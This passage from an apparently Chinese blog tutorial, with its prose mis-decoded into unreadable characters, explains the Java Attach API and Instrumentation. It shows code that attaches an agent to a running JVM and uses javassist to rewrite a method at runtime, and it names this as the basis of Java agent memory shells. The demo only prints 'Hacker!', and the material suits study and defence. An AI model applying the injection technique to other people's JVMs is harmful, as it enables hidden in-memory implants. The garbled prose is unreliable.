è½½ï¼Œæä¾›äº†<code>Attach API</code>ã€‚Attach API å¾ˆç®€å•ï¼Œåªæœ‰ 2 ä¸ªä¸»è¦çš„ç±»ï¼Œéƒ½åœ¨ <code>com.sun.tools.attach</code>åŒ…é‡Œé¢ã€‚</p><p>è¿™ä¸¤ä¸ªç±»ä¸º<code>com.sun.tools.attach.VirtualMachine</code>ç±»å’Œ<code>com.sun.tools.attach.VirtualMachineDescriptor</code>ç±»</p><blockquote><p>è¿™ä¸¤ä¸ªç±»åœ¨tools.jaråŒ…ä¸­ï¼Œå¯èƒ½è¦æ‰‹åŠ¨æ·»åŠ ä¸€ä¸‹jaråŒ…ï¼Œå› ä¸ºæˆ‘åœ¨jdk8u65æµ‹è¯•çš„æ—¶å€™ä»–æ²¡æœ‰è‡ªåŠ¨å¼•å…¥</p><p><img src="https://cdn.clown2024.cn/image-20241030232514951.png" alt="image-20241030232514951"></p></blockquote><h3 id="virtualmachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h3><p>è¯¥ç±»å¯ä»¥å®ç°è·å–JVMä¿¡æ¯ï¼Œå†…å­˜dumpã€ç°æˆdumpã€ç±»ä¿¡æ¯ç»Ÿè®¡ï¼ˆä¾‹å¦‚JVMåŠ è½½çš„ç±»ï¼‰ç­‰åŠŸèƒ½ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™è¯¥ç±»çš„attachæ–¹æ³•ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Šï¼Œä¹‹åå°±å¯ä»¥å¯¹è¯¥JVMåŠè¿›è¡Œæ“ä½œï¼Œæ¯”å¦‚æ³¨å…¥agentå°±æ˜¯ä»¥è¿™ç§å½¢å¼</p><p>ä¸‹é¢æ˜¯è¯¥ç±»çš„ä¸»è¦æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//å…è®¸æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªJVMçš„PIDï¼Œç„¶åè¿œç¨‹è¿æ¥åˆ°è¯¥JVMä¸Š<br>VirtualMachine.attach()<br> <br>//å‘JVMæ³¨å†Œä¸€ä¸ªä»£ç†ç¨‹åºagentï¼Œåœ¨è¯¥agentçš„ä»£ç†ç¨‹åºä¸­ä¼šå¾—åˆ°ä¸€ä¸ªInstrumentationå®ä¾‹ï¼Œè¯¥å®ä¾‹å¯ä»¥ åœ¨classåŠ è½½å‰æ”¹å˜classçš„å­—èŠ‚ç ï¼Œä¹Ÿå¯ä»¥åœ¨classåŠ è½½åé‡æ–°åŠ è½½ã€‚åœ¨è°ƒç”¨Instrumentationå®ä¾‹çš„æ–¹æ³•æ—¶ï¼Œè¿™äº›æ–¹æ³•ä¼šä½¿ç”¨ClassFileTransformeræ¥å£ä¸­æä¾›çš„æ–¹æ³•è¿›è¡Œå¤„ç†<br>VirtualMachine.loadAgent()<br> <br>//è·å¾—å½“å‰æ‰€æœ‰çš„JVMåˆ—è¡¨<br>VirtualMachine.list()<br> <br>//è§£é™¤ä¸ç‰¹å®šJVMçš„è¿æ¥<br>VirtualMachine.detach()<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªæ–¹æ³•è¯•è¯•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030234554068.png" alt="image-20241030234554068"></p><h3 id="virtualmachinedescriptor"><a href="#VirtualMachineDescriptor" class="headerlink" title="VirtualMachineDescriptor"></a>VirtualMachineDescriptor</h3><p>è¯¥ç±»å°±æ˜¯ä¸€ä¸ªæè¿°ç‰¹å®šè™šæ‹Ÿæœºçš„ç±»ï¼Œä»å‰é¢listæ–¹æ³•è·å–çš„è¿”å›å€¼ä¹Ÿèƒ½çŸ¥é“ï¼Œä»–å°±ä»£è¡¨ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå…¶æ–¹æ³•å¯ä»¥è·å–è™šæ‹Ÿæœºçš„å„ç§ä¿¡æ¯å¦‚PIDã€è™šæ‹Ÿæœºåç§°ç­‰ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor virtualMachineDescriptor : VirtualMachine.list()) &#123;<br>            System.out.println(virtualMachineDescriptor);<br>            System.out.println(virtualMachineDescriptor.displayName());<br>            System.out.println(virtualMachineDescriptor.id());<span class="hljs-comment">//æ‰“å°PID</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030235436825.png" alt="image-20241030235436825"></p><h3 id="æ³¨å…¥agent"><a href="#æ³¨å…¥agent" class="headerlink" title="æ³¨å…¥agent"></a>æ³¨å…¥agent</h3><p>ç°åœ¨çŸ¥é“äº†è¿™ä¸¤ä¸ªç±»æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œæ³¨å…¥äº†</p><p>åŒæ ·çš„æˆ‘ä»¬å‰é¢çš„agentè¦æ‰“æˆjaråŒ…ï¼Œç„¶åæˆ‘ä»¬è¿˜è¦å†™ä¸€ä¸ªinjectç±»ç”¨äºæ³¨å…¥</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºç›®æ ‡ç±»åˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent.jar&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå…ˆå°†ç›®æ ‡ç±»è¿è¡Œèµ·æ¥ï¼Œä¸€æ®µæ—¶é—´åå¼€å¯æˆ‘ä»¬çš„injectç±»</p><p><img src="https://cdn.clown2024.cn/image-20241031000148056.png" alt="image-20241031000148056"></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸæ³¨å…¥ç›®æ ‡ç±»ä¸­</p><h1 id="instrumentationå®ä¾‹"><a href="#Instrumentationå®ä¾‹" class="headerlink" title="Instrumentationå®ä¾‹"></a>Instrumentationå®ä¾‹</h1><h2 id="instrumentationä»‹ç»"><a href="#Instrumentationä»‹ç»" class="headerlink" title="Instrumentationä»‹ç»"></a>Instrumentationä»‹ç»</h2><p>åœ¨å®ç°agentçš„æ–¹æ³•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°é™¤äº†å‚æ•°çš„æ¥å—ï¼Œä»–è¿˜æœ‰å¦ä¸€ä¸ªInstrumentationç±»å‹çš„å‚æ•°ï¼Œè¯¥ç±»åœ¨java.lang.instrumentåŒ…ä¸‹ï¼Œé‚£ä¹ˆä»€ä¹ˆæ˜¯Instrumentationå‘¢</p><p>Instrumentation æ˜¯ JVMTIAgentï¼ˆJVM Tool Interface Agentï¼‰çš„ä¸€éƒ¨åˆ†ï¼ŒJava agent é€šè¿‡è¿™ä¸ªç±»å’Œç›®æ ‡ JVM è¿›è¡Œäº¤äº’ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹æ•°æ®çš„æ•ˆæœã€‚</p><p>Instrumentationæ˜¯ä¸€ä¸ªæ¥å£ï¼Œå…¶å¸¸ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Instrumentation</span> &#123;<br>    <br>    <span class="hljs-comment">//å¢åŠ ä¸€ä¸ªClass æ–‡ä»¶çš„è½¬æ¢å™¨ï¼Œè½¬æ¢å™¨ç”¨äºæ”¹å˜ Class äºŒè¿›åˆ¶æµçš„æ•°æ®ï¼Œå‚æ•° canRetransform è®¾ç½®æ˜¯å¦å…è®¸é‡æ–°è½¬æ¢ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer, <span class="hljs-type">boolean</span> canRetransform)</span>;<br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹å‰ï¼Œé‡æ–°å®šä¹‰ Class æ–‡ä»¶ï¼ŒClassDefinition è¡¨ç¤ºå¯¹ä¸€ä¸ªç±»æ–°çš„å®šä¹‰ï¼Œå¦‚æœåœ¨ç±»åŠ è½½ä¹‹åï¼Œéœ€è¦ä½¿ç”¨ retransformClasses æ–¹æ³•é‡æ–°å®šä¹‰ã€‚addTransformeræ–¹æ³•é…ç½®ä¹‹åï¼Œåç»­çš„ç±»åŠ è½½éƒ½ä¼šè¢«Transformeræ‹¦æˆªã€‚å¯¹äºå·²ç»åŠ è½½è¿‡çš„ç±»ï¼Œå¯ä»¥æ‰§è¡ŒretransformClassesæ¥é‡æ–°è§¦å‘è¿™ä¸ªTransformerçš„æ‹¦æˆªã€‚ç±»åŠ è½½çš„å­—èŠ‚ç è¢«ä¿®æ”¹åï¼Œé™¤éå†æ¬¡è¢«retransformï¼Œå¦åˆ™ä¸ä¼šæ¢å¤ã€‚</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">addTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br>    <span class="hljs-comment">//åˆ é™¤ä¸€ä¸ªç±»è½¬æ¢å™¨</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">removeTransformer</span><span class="hljs-params">(ClassFileTransformer transformer)</span>;<br> <br> <br>    <span class="hljs-comment">//åœ¨ç±»åŠ è½½ä¹‹åï¼Œé‡æ–°å®šä¹‰ Classã€‚è¿™ä¸ªå¾ˆé‡è¦ï¼Œè¯¥æ–¹æ³•æ˜¯1.6 ä¹‹ååŠ å…¥çš„ï¼Œäº‹å®ä¸Šï¼Œè¯¥æ–¹æ³•æ˜¯ update äº†ä¸€ä¸ªç±»ï¼Œç›¸å½“äºé‡æ–°åŠ è½½ä½¿æˆ‘ä»¬çš„ä¿®æ”¹ç”Ÿæ•ˆ</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">retransformClasses</span><span class="hljs-params">(Class&lt;?&gt;... classes)</span> <span class="hljs-keyword">throws</span> UnmodifiableClassException;<br> <br> <br>    <span class="hljs-comment">//åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦èƒ½è¢«ä¿®æ”¹</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isModifiableClass</span><span class="hljs-params">(Class&lt;?&gt; theClass)</span>;<br> <br>    <span class="hljs-comment">// è·å–ç›®æ ‡æ‰€æœ‰å·²ç»åŠ è½½çš„ç±»ã€‚</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span><br>    Class[] getAllLoadedClasses();<br> <br>    <span class="hljs-comment">//è·å–ä¸€ä¸ªå¯¹è±¡çš„å¤§å°</span><br>    <span class="hljs-type">long</span> <span class="hljs-title function_">getObjectSize</span><span class="hljs-params">(Object objectToSize)</span>;<br> <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="instrumentationä½¿ç”¨"><a href="#Instrumentationä½¿ç”¨" class="headerlink" title="Instrumentationä½¿ç”¨"></a>Instrumentationä½¿ç”¨</h2><p>æˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹å‰é¢çš„agentMainæ¥è¯•ä¸€è¯•Instrumentationçš„åŠŸèƒ½ï¼Œæˆ‘ä»¬ç»™ç›®æ ‡ç±»æ·»åŠ ä¸€ä¸ªClassFileTransformerç±»è½¬æ¢å™¨</p><p>ClassFileTransformeræ¥å£ä¸‹åªæœ‰ä¸€ä¸ªtransformæ–¹æ³•ï¼Œé‡å†™è¯¥æ–¹æ³•å³å¯è½¬æ¢ä»»æ„ç±»æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„è¢«å–ä»£çš„ç±»æ–‡ä»¶ï¼Œåœ¨ java agent å†…å­˜é©¬ä¸­ä¾¿æ˜¯åœ¨è¯¥æ–¹æ³•ä¸‹é‡å†™æ¶æ„ä»£ç ï¼Œä»è€Œä¿®æ”¹åŸæœ‰ç±»æ–‡ä»¶ä»£ç é€»è¾‘ï¼Œä¸ addTransformer æ­é…ä½¿ç”¨ã€‚</p><p>ç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            Hello();<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Hello</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æ”¹ä¸€ä¸‹æˆ‘ä»¬çš„agentMain</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Class[] allLoadedClasses = inst.getAllLoadedClasses();<span class="hljs-comment">//è·å–æ‰€æœ‰å·²åŠ è½½çš„ç±»</span><br>        <span class="hljs-comment">//è·å–ç›®æ ‡JVMåŠ è½½çš„å…¨éƒ¨ç±»</span><br>        <span class="hljs-keyword">for</span>(Class cls : allLoadedClasses)&#123;<br>            <span class="hljs-keyword">if</span> (cls.getName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>))&#123;<br><br>                <span class="hljs-comment">//æ·»åŠ ä¸€ä¸ªtransformeråˆ°Instrumentationï¼Œå¹¶é‡æ–°è§¦å‘ç›®æ ‡ç±»åŠ è½½</span><br>                inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TestTransform</span>(),<span class="hljs-literal">true</span>);<br>                inst.retransformClasses(cls);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯æˆ‘ä»¬çš„ClassFileTransformerï¼Œè¿™é‡Œç”¨javassistæ¥ä¿®æ”¹ç±»</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtMethod;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestTransform</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//è·å–CtClass å¯¹è±¡çš„å®¹å™¨ ClassPool</span><br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br><br>            <span class="hljs-comment">//æ·»åŠ é¢å¤–çš„ç±»æœç´¢è·¯å¾„</span><br>            <span class="hljs-keyword">if</span> (classBeingRedefined != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">ClassClassPath</span> <span class="hljs-variable">ccp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(classBeingRedefined);<br>                classPool.insertClassPath(ccp);<br>            &#125;<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡ç±»</span><br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> classPool.get(<span class="hljs-string">&quot;org.example.Main&quot;</span>);<br>            System.out.println(ctClass);<br><br>            <span class="hljs-comment">//è·å–ç›®æ ‡æ–¹æ³•</span><br>            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;Hello&quot;</span>);<br>            <span class="hljs-comment">//è®¾ç½®æ–¹æ³•ä½“</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">body</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;System.out.println(\&quot;Hacker!\&quot;);&#125;&quot;</span>;<br>            ctMethod.setBody(body);<br>            <span class="hljs-comment">//è¿”å›ç›®æ ‡ç±»å­—èŠ‚ç </span><br>            <span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br>            <span class="hljs-keyword">return</span> bytes;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬çš„MFæ–‡ä»¶éœ€è¦ä¿®æ”¹æˆå¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br>Can-Redefine-Classes: true<br>Can-Retransform-Classes: true<br><br></code></pre></td></tr></table></figure><p>ç„¶åç›´æ¥ç”¨mavenæ‰“jaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241031113452048.png" alt="image-20241031113452048"></p><blockquote><p>mavenæ‰“æˆjaråŒ…æœ‰ä¸€ä¸ªå‘ç‚¹ï¼Œä»–ä¼šé»˜è®¤æ›¿æ¢ä½ çš„MFæ–‡ä»¶å˜æˆè¿™æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241031114835052.png" alt="image-20241031114835052"></p><p>æˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æ›¿æ¢ä¸€ä¸‹jaråŒ…é‡Œé¢çš„MFæ–‡ä»¶ï¼Œæˆ–è€…æˆ‘ä»¬å¯ä»¥é…ç½®ä¸€ä¸‹mavençš„æ‰“åŒ…æ’ä»¶è®©ä»–è‡ªåŠ¨ç”ŸæˆMFæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-jar-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">archive</span>&gt;</span><br>                        <span class="hljs-comment">&lt;!--è‡ªåŠ¨æ·»åŠ META-INF/MANIFEST.MF --&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifest</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">addClasspath</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">addClasspath</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">manifestEntries</span>&gt;</span><br><span class="hljs-comment">&lt;!--                            &lt;Premain-Class&gt;org.example.Agent.premainAgent&lt;/Premain-Class&gt;--&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Agent-Class</span>&gt;</span>org.example.Agent.agentmainAgent<span class="hljs-tag">&lt;/<span class="hljs-name">Agent-Class</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Redefine-Classes</span>&gt;</span><br>                            <span class="hljs-tag">&lt;<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">Can-Retransform-Classes</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">manifestEntries</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">archive</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç°åœ¨å†æ‰“åŒ…å°±æœ‰éœ€è¦çš„å±æ€§äº†</p><p><img src="https://cdn.clown2024.cn/image-20241031115458888.png" alt="image-20241031115458888"></p></blockquote><p>æœ€åç¼–å†™Agentçš„æ³¨å…¥ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachine;<br><span class="hljs-keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Inject</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//è°ƒç”¨VirtualMachine.list()è·å–æ­£åœ¨è¿è¡Œçš„JVMåˆ—è¡¨</span><br>        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span>(VirtualMachineDescriptor vmd : list) &#123;<br>            <span class="hljs-comment">//éå†æ¯ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„JVMï¼Œå¦‚æœJVMåç§°ä¸ºç›®æ ‡ç±»åˆ™è¿æ¥è¯¥JVMå¹¶åŠ è½½ç‰¹å®šAgent</span><br>            <span class="hljs-keyword">if</span> (vmd.displayName().equals(<span class="hljs-string">&quot;org.example.Main&quot;</span>)) &#123;<br>                <span class="hljs-comment">//è¿æ¥æŒ‡å®šJVM</span><br>                <span class="hljs-type">VirtualMachine</span> <span class="hljs-variable">virtualMachine</span> <span class="hljs-operator">=</span> VirtualMachine.attach(vmd.id());<br>                <span class="hljs-comment">//åŠ è½½Agent</span><br>                virtualMachine.loadAgent(<span class="hljs-string">&quot;D:\\CTF\\Java\\JavaCode\\JavaAgent\\JavaAgent-1.0-SNAPSHOT.jar&quot;</span>);<br>                <span class="hljs-comment">//æ–­å¼€JVMè¿æ¥</span><br>                virtualMachine.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><blockquote><p>ä¸è¿‡å¦‚æœæƒ³è¦ç”¨javassistæ¥ä¿®æ”¹çš„è¯ï¼Œç›®æ ‡ç±»ä¹Ÿéœ€è¦å¼•å…¥javassistä¾èµ–æ‰è¡Œï¼Œä¸ç„¶ä¼šæŠ¥é”™</p></blockquote><p><img src="https://cdn.clown2024.cn/image-20241031115558447.png" alt="image-20241031115558447"></p><h2 id="instrumentationçš„å±€é™"><a href="#Instrumentationçš„å±€é™" class="headerlink" title="Instrumentationçš„å±€é™"></a>Instrumentationçš„å±€é™</h2><p>premain å’Œ agentmain ä¸¤ç§æ–¹å¼<strong>ä¿®æ”¹å­—èŠ‚ç </strong>çš„æ—¶æœºéƒ½æ˜¯ç±»æ–‡ä»¶åŠ è½½ä¹‹åï¼Œä¸èƒ½é€šè¿‡å­—èŠ‚ç æ–‡ä»¶å’Œè‡ªå®šä¹‰çš„ç±»åé‡æ–°å®šä¹‰ä¸€ä¸ªæœ¬æ¥ä¸å­˜åœ¨çš„ç±»ã€‚</p><p>ç±»çš„å­—èŠ‚ç ä¿®æ”¹ç§°ä¸ºç±»è½¬æ¢ (Class 